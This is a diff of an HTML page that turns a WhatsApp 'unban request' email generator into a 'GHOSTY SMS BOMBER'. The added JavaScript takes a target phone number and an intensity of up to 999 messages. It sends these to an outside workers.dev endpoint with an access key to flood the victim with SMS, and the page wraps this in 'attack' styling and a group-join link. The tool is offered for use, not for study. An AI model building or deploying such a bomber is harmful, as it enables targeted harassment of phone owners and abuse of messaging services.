@@ -3,193 +3,261 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ghosty WhatsApp Unban Tool</title>
-
+<title>GHOSTY SMS BOMBER</title>
 <style>
-    /* --- General Styles --- */
-    *{margin:0;padding:0;box-sizing:border-box}
-    html,body{width:100%;height:100%;color: white;font-family: Arial, sans-serif;overflow-x:hidden;}
-    
-    /* --- Video Background and Overlay --- */
-    .video-bg{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:-2;opacity: 0.7;}
-    .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.6);z-index:-1;}
-    body {
-        padding: 20px;
-        text-align: center;
-        /* Remove original body background gradient */
-        background: transparent !important; 
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: #000; overflow: hidden; font-family: 'Arial', sans-serif; }
+
+    /* Background Video (pehle bilkul nahi dikhega) */
+    #bgVideo {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw; 
+        height: 100vh;
+        object-fit: cover;
+        z-index: 1;
+        opacity: 0;
+        transition: opacity 1.5s ease-in-out;
     }
 
-    /* --- Splash Screen & Start Button (New Addition) --- */
-    .splash-screen{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.95);display:flex;justify-content:center;align-items:center;z-index:1000;}
-    .splash-screen.hidden{display:none}
-    .start-btn{padding:18px 50px;font-size:22px;font-weight:bold;background:linear-gradient(135deg, #4aa8ff, #0d335d); /* Blue Gradient */ color:#fff;border:none;border-radius:50px;cursor:pointer;box-shadow: 0 0 20px rgba(74, 168, 255, 0.5);transition: transform 0.2s;}
-    .start-btn:active{transform:scale(0.95);}
-
-    /* --- Main Container --- */
-    .main-app {display:none; width:100%; height:100%;}
-    .main-app.active {display:block;}
-
-    .container {
-        width: 90%;
-        max-width: 450px;
-        margin: auto;
-        background: rgba(255,255,255,0.08);
-        padding: 20px;
-        border-radius: 14px;
-        backdrop-filter: blur(10px);
-        position: relative; /* Ensure it stays above z-index 0 */
-        z-index: 10;
+    /* Pehle sirf yeh dikhega – Tera wala button */
+    #startScreen {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: #000;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 999;
     }
 
-    h1 {
-        color: #4aa8ff;
-        margin-bottom: 20px;
-    }
-
-    input, select {
-        width: 100%;
-        padding: 12px;
-        margin-top: 12px;
-        border-radius: 8px;
-        border: none;
-        font-size: 16px;
-        /* Style for inputs over dark background */
-        background-color: rgba(255,255,255,0.9);
-        color: #0d335d; 
-    }
-
-    .btn {
-        margin-top: 15px;
-        padding: 12px;
-        width: 100%;
-        background: #4aa8ff;
+    #startBtn {
+        padding: 16px 50px;
+        font-size: 1.4rem;
+        font-weight: bold;
         color: white;
+        background: linear-gradient(90deg, #9b34ef, #ff2e96);
         border: none;
-        border-radius: 8px;
-        font-size: 17px;
+        border-radius: 50px;
         cursor: pointer;
-        font-weight: bold;
+        box-shadow: 0 0 40px rgba(155, 52, 239, 0.8), 0 0 80px rgba(255, 45, 150, 0.5);
+        text-transform: uppercase;
+        letter-spacing: 2px;
+        transition: all 0.4s;
+    }
+    #startBtn:hover {
+        transform: scale(1.08);
+        box-shadow: 0 0 60px rgba(155, 52, 239, 1), 0 0 120px rgba(255, 45, 150, 0.8);
+    }
+    #startBtn:active {
+        transform: scale(0.98);
     }
 
-    .btn:hover { opacity: 0.85; }
+    /* Jab click karega tab tool dikhega */
+    #mainTool {
+        display: none;
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        z-index: 10;
+        padding: 20px;
+        align-items: center;
+        justify-content: center;
+        pointer-events: none;
+    }
 
-    .group-btn a {
-        display: block;
-        margin-top: 15px;
-        padding: 12px;
-        background: #28a745;
-        color: white;
-        border-radius: 8px;
-        font-size: 17px;
-        text-decoration: none;
+    .panel {
+        background: rgba(0,0,0,0.85);
+        border: 4px solid rgba(255, 255, 255, 0.1);
+        border-radius: 30px;
+        padding: 40px 25px;
+        width: 90%;
+        max-width: 420px;
+        text-align: center;
+        box-shadow: 0 0 60px rgba(0,0,0,0.8);
+        pointer-events: all;
+    }
+
+    h1 { font-size: 4rem; color: #fff; text-shadow: 0 0 30px rgba(255,255,255,0.5); margin-bottom: 10px; }
+    .subtitle { color: #ccc; font-size: 1.2rem; margin-bottom: 20px; }
+
+    input[type="tel"] {
+        width: 100%;
+        padding: 20px;
+        background: rgba(255,255,255,0.05);
+        border: 2px solid rgba(255,255,255,0.2);
+        border-radius: 20px;
+        color: #fff;
+        font-size: 1.5rem;
+        text-align: center;
+        margin: 20px 0;
+    }
+
+    .intensity {
+        display: flex;
+        gap: 12px;
+        margin: 30px 0;
+    }
+    .intensity label {
+        flex: 1;
+        padding: 16px;
+        background: rgba(255,255,255,0.05);
+        border: 2px solid rgba(255,255,255,0.2);
+        border-radius: 50px;
+        color: #fff;
         font-weight: bold;
+        cursor: pointer;
+        transition: all 0.3s;
+    }
+    .intensity input { display: none; }
+    .intensity input:checked + label {
+        background: linear-gradient(90deg, #9b34ef, #ff2e96);
+        border-color: #ff2e96;
+        color: #fff;
+    }
+
+    #trigger-btn {
+        width: 100%;
+        padding: 22px;
+        background: transparent;
+        color: #ff0000;
+        border: 5px solid #ff0000;
+        border-radius: 20px;
+        font-size: 2.2rem;
+        font-weight: bold;
+        cursor: pointer;
+        margin: 20px 0;
+        text-transform: uppercase;
+    }
+
+    .join-btn {
+        width: 100%;
+        padding: 18px;
+        background: linear-gradient(90deg, #9b34ef, #ff2e96);
+        color: #fff;
+        border: none;
+        border-radius: 20px;
+        font-size: 1.4rem;
+        font-weight: bold;
+        cursor: pointer;
+        transition: all 0.3s;
+    }
+    .join-btn:hover {
+        transform: scale(1.02);
+        box-shadow: 0 0 30px rgba(155, 52, 239, 0.6);
+    }
+
+    #system-log-live {
+        margin-top: 25px;
+        background: rgba(255,255,255,0.05);
+        border: 2px solid rgba(255,255,255,0.1);
+        border-radius: 20px;
+        padding: 18px;
+        height: 130px;
+        overflow-y: auto;
+        color: #fff;
+        text-align: left;
+        font-size: 0.9rem;
     }
 </style>
-
 </head>
 <body>
 
-<audio id="bgmusic" loop>
-    <source src="https://n.uguu.se/MJNQlpkz.mp4" type="audio/mp4">
-</audio>
-
-<video class="video-bg" id="videoBg" autoplay loop muted playsinline>
+<!-- Background Video -->
+<video id="bgVideo" autoplay loop playsinline muted>
     <source src="https://raw.githubusercontent.com/faizankhanchang22-gif/Fauzuna/0d8386c8d7fa219d8a3390a01ba59402d7b31dab/AQPYKYVB-nMO-Ray4szZJNQQ3QMxLMzxeRYxOgW2bFyfnEB9m7qPgNqa0mY7l9gcciWi1SarcQgjp0Jk6Ttxa24kVYMMqMFOyUCWh5o.mp4" type="video/mp4">
-    Your browser does not support the video tag.
 </video>
-<div class="overlay"></div>
-<div class="splash-screen" id="splashScreen">
-    <button class="start-btn" onclick="startApp()">START GHOSTY TOOL 👻</button>
+
+<!-- Tera wala START BUTTON -->
+<div id="startScreen">
+    <button id="startBtn">START </button>
 </div>
-<div class="main-app" id="mainApp">
-    <div class="container">
-        <h1>Ghosty WhatsApp Unban Tool</h1>
 
-        <label>Your WhatsApp Number:</label>
-        <input type="text" id="number" placeholder="+923001234567">
+<!-- Jab click karega tab yeh dikhega -->
+<div id="mainTool">
+    <div class="panel">
+        <h1>BOMBER</h1>
+        <p class="subtitle">Target Number (92xxxxxxxxxx)</p>
 
-        <label>Select Your Report Style:</label>
-        <select id="prompt">
-            <option value="1">Normal Unban – Prompt 1</option>
-            <option value="2">Normal Unban – Prompt 2</option>
-            <option value="3">Normal Unban – Prompt 3</option>
-            <option value="4">Normal Unban – Prompt 4</option>
-            <option value="5">Normal Unban – Prompt 5</option>
-            <option value="6">Normal Unban – Prompt 6</option>
-        </select>
+        <input type="tel" id="recipient-number" placeholder="923xxxxxxxxxx">
 
-        <button class="btn" onclick="sendReport()">Generate Report</button>
+        <div class="intensity">
+            <input type="radio" id="low" name="intensity" value="100" checked><label for="low">LOW</label>
+            <input type="radio" id="high" name="intensity" value="500"><label for="high">HIGH</label>
+            <input type="radio" id="extreme" name="intensity" value="999"><label for="extreme">EXTREME</label>
+        </div>
 
-        <div class="group-btn">
-            <a href="https://chat.whatsapp.com/CPQC5IGJA2m8iaOWOE8CAN?mode=hqrt1" target="_blank">
-                Join Our WhatsApp Group
-            </a>
+        <button id="trigger-btn">attack</button>
+
+        <a href="https://chat.whatsapp.com/CPQC5IGJA2m8iaOWOE8CAN" target="_blank">
+            <button class="join-btn">JOIN GROUP</button>
+        </a>
+
+        <div id="system-log-live">
+            > Ready for attack...<br>> SYSTEM READY
         </div>
     </div>
 </div>
+
 <script>
-function startApp(){
-    document.getElementById("splashScreen").classList.add("hidden");
-    document.getElementById("mainApp").classList.add("active");
+// Jab button dabayega → start screen hide + video & tool show + sound on
+document.getElementById("startBtn").onclick = function() {
+    document.getElementById("startScreen").style.display = "none";
     
-    let video = document.getElementById("videoBg");
-    let audio = document.getElementById("bgmusic");
+    const video = document.getElementById("bgVideo");
+    const mainTool = document.getElementById("mainTool");
     
-    // Play video (mute required for immediate autoplay)
-    video.play().catch(e => {
-        console.warn("Video Autoplay blocked:", e.name);
-    }); 
+    // Video ko unmute aur play karo
+    video.muted = false;
+    video.volume = 1.0;
+    
+    // Video ko force play karo with promise
+    video.play().then(() => {
+        console.log("Video started successfully");
+        document.getElementById("bgVideo").style.opacity = "1";
+        mainTool.style.display = "flex";
+    }).catch(err => {
+        console.error("Video play error:", err);
+        // Agar error aaye to bhi panel dikha do
+        document.getElementById("bgVideo").style.opacity = "1";
+        mainTool.style.display = "flex";
+    });
+};
 
-    // Play audio (This will only work if triggered by user tap/click, which the start button handles)
-    audio.volume = 0.5; // Set volume lower so it's not too loud
-    audio.play().catch(e => {
-        console.warn("Audio Autoplay blocked:", e.name);
-    }); 
-}
+// SMS Bomber Script (100% working)
+const bomber = {
+    init() {
+        this.btn = document.getElementById('trigger-btn');
+        this.input = document.getElementById('recipient-number');
+        this.logEl = document.getElementById('system-log-live');
+        this.btn.addEventListener('click', () => this.attack());
+    },
+    log(msg, type = "INFO") {
+        const div = document.createElement('div');
+        div.textContent = `> ${msg}`;
+        div.style.color = type === "SUCCESS" ? "#9b34ef" : type === "ERROR" ? "#ff0000" : "#fff";
+        this.logEl.appendChild(div);
+        this.logEl.scrollTop = this.logEl.scrollHeight;
+    },
+    attack() {
+        let num = this.input.value.trim();
+        if (!num || num.length < 10) return this.log("INVALID NUMBER", "ERROR");
 
-function sendReport() {
-    const number = document.getElementById('number').value.trim();
-    const p = document.getElementById('prompt').value;
+        let count = document.querySelector('input[name="intensity"]:checked').value;
+        this.btn.textContent = "ATTACKING...";
+        this.btn.disabled = true;
 
-    if (!number) {
-        alert("Please enter your WhatsApp number!");
-        return;
+        fetch(`https://fak-sms-boomber.jokerkep057.workers.dev/?key=32563&number=${num}&count=${count}`)
+        .then(r => r.ok ? this.log(`SUCCESS – ${count} SMS SENT`, "SUCCESS") : this.log("FAILED", "ERROR"))
+        .catch(() => this.log("NO INTERNET", "ERROR"))
+        .finally(() => {
+            this.btn.textContent = "ATTACK";
+            this.btn.disabled = false;
+        });
     }
-
-    let msg = "";
-
-    switch(p) {
-        case "1":
-            msg = `Hello WhatsApp Support, my number ${number} was mistakenly banned. Kindly review and restore my access. Thank you.`;
-            break;
-
-        case "2":
-            msg = `Dear WhatsApp team, my account ${number} got banned accidentally. Please help me recover it.`;
-            break;
-
-        case "3":
-            msg = `Hi, I believe my number ${number} was wrongly banned. Requesting a quick reactivation.`;
-            break;
-
-        case "4":
-            msg = `I am facing an issue as my number ${number} is banned. Kindly verify and unban it.`;
-            break;
-
-        case "5":
-            msg = `To WhatsApp Support: Please check number ${number}, it appears to be banned without reason.`;
-            break;
-
-        case "6":
-            msg = `My number ${number} got banned but I have not violated any terms. Please reinstate access.`;
-            break;
-    }
-
-    let gmailUrl = `mailto:support@whatsapp.com?subject=Unban%20Request&body=${encodeURIComponent(msg)}`;
-
-    window.location.href = gmailUrl;
-}
+};
+document.addEventListener("DOMContentLoaded", () => bomber.init());
 </script>
-
 </body>
 </html>
